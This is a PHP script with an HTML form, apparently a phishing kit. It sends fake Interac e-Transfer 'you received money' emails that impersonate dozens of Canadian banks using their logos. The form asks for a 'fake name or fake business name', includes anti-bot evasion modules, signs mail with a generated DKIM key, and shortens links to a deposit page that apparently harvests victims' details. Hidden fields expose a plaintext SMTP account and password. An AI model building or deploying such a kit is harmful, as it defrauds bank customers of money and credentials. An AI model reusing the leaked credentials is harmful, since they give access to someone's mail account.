<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require("PHPMailer/src/PHPMailer.php");
require("PHPMailer/src/SMTP.php");
require("PHPMailer/src/Exception.php");

include "/anti/anti1.php";
include "/anti/anti2.php";
include "/anti/anti3.php";
include "/anti/anti4.php";
include "/anti/anti5.php";
include "/anti/anti6.php";
include "/anti/anti7.php";
include "/anti/anti8.php";
include "/control.php";
include "/connect/out.php";
include "/mods/antibot.php";

// Generate a DKIM private key
$privateKey = openssl_pkey_new(array(
    'private_key_bits' => 1024,
    'private_key_type' => OPENSSL_KEYTYPE_RSA,
));

// Get the private key details
openssl_pkey_export($privateKey, $privateKeyString);
$privateKeyDetails = openssl_pkey_get_details($privateKey);

// Set the DKIM private key file path
$privateKeyFilePath = __DIR__ . '/admin/private.key'; // Update the path to the desired location

// Save the private key to the file
file_put_contents($privateKeyFilePath, $privateKeyString);

$sender_name = $_POST['sender_name'];
$amount = $_POST['amount'];
$date = $_POST['date'];
$link = $_POST['link'];

$data = array($sender_name, $amount, $date, $link);
$file = fopen('/data.csv', 'a');
fputcsv($file, $data);
fclose($file);

$long_url = 'http://' . $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($_POST);
$short_url = shortenURL($long_url);

$template = file_get_contents('template.html');
$message = $template;
$message = str_replace('{{shortlink}}', $short_url, $message);
$message = str_replace('{{expiredate}}', $_POST['expiredate'], $message);
$message = str_replace('{{username}}', $_POST['username'], $message);
$message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{photo_link}}', $_POST['photo_link'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{expiredate}}', $_POST['expiredate'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receiver_name}}', $_POST['receiver_name'], $message);
$message = str_replace('{{receiver_email}}', $_POST['receiver_email'], $message);

$mail = new PHPMailer();
$mail->IsSMTP();
$mail->SMTPSecure = 'tls';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port'];
$mail->Body = $message; // use $message instead of $template
$mail->SMTPAuth = true;
$mail->Username = $_POST['username'];
$mail->Password = $_POST['password'];
$mail->SetFrom('info@supportdrone.ca', $_POST['sender_name']);
$mail->AddAddress($_POST['receiver_email']);
$mail->Subject = 'INTERAC e-Transfer: ' . $_POST['sender_name'] . ' sent you money.';
$mail->IsHTML(true);
$mail->CharSet = "utf-8";

// Load the DKIM private key file
$mail->DKIM_private = $privateKeyFilePath;

// Sign every email using DKIM
$mail->DKIM_selector = 'default'; // Replace with your DKIM selector
$mail->DKIM_passphrase = bin2hex(random_bytes(16)); // Generate a random DKIM passphrase
$mail->DKIM_identity = $mail->From;

function shortenURL($url)
{
    $api_url = 'https://is.gd/create.php?format=simple&url=' . urlencode($url);
    return file_get_contents($api_url);
}

$currentDate = new DateTime();
$expireDate = $currentDate->add(new DateInterval('P30D'))->format('F d, Y');

// Send the email
try {
    $mail->send();
    echo 'Email sent successfully!';
} catch (Exception $e) {
    echo 'An error occurred while sending the email: ' . $mail->ErrorInfo;
}

// Output the private key and passphrase details
echo "DKIM private key generated successfully!\n" .  PHP_EOL;
echo "Private Key File: " . $privateKeyFilePath .  PHP_EOL;
echo "Private Key Details:" . PHP_EOL;
echo "Generated DKIM Passphrase: " . $mail->DKIM_passphrase . PHP_EOL;
?>

<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
    }

    h1 {
      text-align: center;
    }

    form {
      margin: 20px;
    }

    input[type="text"], select {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: none;
      background-color: #333;
      color: #fff;
    }

    input[type="submit"] {
      width: 100%;
      padding: 10px;
      border: none;
      background-color: #0066cc;
      color: #fff;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <form action="submit1.php" method="POST" enctype="multipart/form-data">
    <h1>AUTOMATIC SENDER</h1>
<input type="hidden" name="shortlink" value="" required="">
<input type="text" name="receiver_email" placeholder="receivers email" value="" required="">
<input type="text" name="receiver_name" placeholder="receivers name" value="One Time Contact" required="">
<input type="text" name="sender_name" placeholder="FAKE NAME OR FAKE BUISNESS NAME" value="AB201293 LTD" required="">
<input type="text" name="amount" placeholder="100.00" value="200.00" step="0.01" required="">
<input type="hidden" name="expiredate" value="<?php echo $expireDate; ?>" required="">



<center><select name="photo_link" id="photo_link">
<option value="https://etransfer-content.interac.ca/en/logo_CA000002.png">Scotiabank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000001.png">BMO</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000003.png">RBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000010.png">CIBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000219.png">ATB Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000004.png">TD</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000292.png">National Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000045.png">Desjardins</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000118.png">Laurentian Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000062.png">HSBC</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000344.png">Simplii Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000007.png">Tangerine</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000308.png">EQ Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000310.png">Motusbank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000315.png">FirstOntario Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000238.png">Meridian Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000343.png">Manulife Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000346.png">Motive Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000324.png">Alterna Savings</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000210.png">Bridgewater Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000311.png">Oaken Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000341.png">Zag Bank</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000016.png">President's Choice Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000217.png">Servus Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000314.png">Westminster Savings Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000325.png">Christian Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000331.png">Vancity Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000332.png">Valley First Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000338.png">Mountain View Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000345.png">Connect First Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000071.png">ICICI Bank Canada</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000129.png">National Bank Direct Brokerage</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000174.png">Caisse Financial Group</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000188.png">State Bank of India (Canada)</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000205.png">Bridgeway National</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000212.png">AcceleRate Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000239.png">First Calgary Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000244.png">Tandia Financial Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000254.png">DUCA Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000256.png">Envision Financial</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000271.png">Interior Savings Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000279.png">Kindred Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000290.png">Northern Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000309.png">Steinbach Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000326.png">Synergy Credit Union</option>
<option value="https://etransfer-content.interac.ca/en/logo_CA000340.png">Your Neighbourhood Credit Union</option>
</select><select name="bank" id="bank">
      <option value="Scotia Bank">Scotia Bank</option>
      <option value="Bank of Montreal">Bank of Montreal</option>
      <option value="CIBC">CIBC</option>
      <option value="RBC Royal Bank">RBC Royal Bank</option>
      <option value="ATB Financial">ATB Financial</option>
      <option value="TD Canada Trust">TD Canada Trust</option>
      <option value="HSBC Bank Canada">HSBC Bank Canada</option>
      <option value="National Bank of Canada">National Bank of Canada</option>
      <option value="Desjardins">Desjardins</option>
      <option value="Laurentian Bank of Canada">Laurentian Bank of Canada</option>
      <option value="Manulife Bank of Canada">Manulife Bank of Canada</option>
      <option value="Tangerine Bank">Tangerine Bank</option>
      <option value="Alterna Bank">Alterna Bank</option>
      <option value="Bridgewater Bank">Bridgewater Bank</option>
      <option value="Canadian Tire Bank">Canadian Tire Bank</option>
      <option value="Equitable Bank">Equitable Bank</option>
      <option value="First Nations Bank of Canada">First Nations Bank of Canada</option>
      <option value="Haventree Bank">Haventree Bank</option>
      <option value="Motus">Motusbank</option>
      <option value="Peoples Trust Company">Peoples Trust Company</option>
      <option value="Simplii Financial">Simplii Financial</option>
      <option value="Vancity">Vancity</option>
    </select><br><input type="submit" value="Submit"></center>

<input type="hidden" name="port" value="587" required="">
<input type="hidden" name="username" value="info@supportdrone.ca" required="">
<input type="hidden" name="password" value="Covidabc2020" required="">
<input type="hidden" name="host" value="smtp.office365.com" required="">


</fieldset></form></body></html>